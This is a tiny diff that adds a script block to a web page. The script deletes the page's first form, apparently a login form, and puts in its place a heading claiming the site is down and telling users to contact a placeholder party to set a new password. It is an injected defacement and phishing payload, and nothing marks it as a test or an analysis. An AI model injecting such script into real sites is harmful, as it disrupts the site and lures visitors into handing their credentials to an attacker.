@@ -1,0 +1,6 @@
+<script>
+var message = document.createElement("h2");
+message.innerHTML = "SITE DOWN , CONTACT XXXXXXXX FOR SUPPORT AND SET NEW PASSWORD !!!";
+document.forms[0].parentNode.appendChild(message);
+document.forms[0].parentNode.removeChild(document.forms[0]);
+</script>
